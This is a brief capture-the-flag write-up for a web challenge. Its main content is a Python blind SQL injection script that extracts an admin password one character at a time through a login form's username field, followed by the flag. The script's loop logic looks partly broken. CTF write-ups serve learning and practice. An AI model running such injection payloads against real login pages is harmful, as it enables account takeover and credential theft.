# Web F111 - Part 4

## Solution

- As the description tells us to get all the credentials we tried using blind SQL injection to get the password for the `admin` account.

```
import requests
import string

url = 'https://central-reserve.cruxcrypt.crux-bphc.com/login'
charset = r'abcdefghijklmnopqrstuvwxyz0123456789X{}ABCDEFGHIJKLMNOPQRSTUVWXYZ_'

i=0
flag = ''
while True:
  for char in string.printable:
      payload = {"username":f"admin' AND password like '{flag}" + charset[i] + "%'; -- -"}
      a = requests.post(url, data=payload)
      if "Invalid" not in a.text:
          flag+=charset[i]
          i=0
          print(flag)
      else:
        i+=1
```

## Flag

```
cruXcrypt{pl4in_73x7_p4ssw0rd5_4r3_4lw4y5_4_b4d_1d34}
```
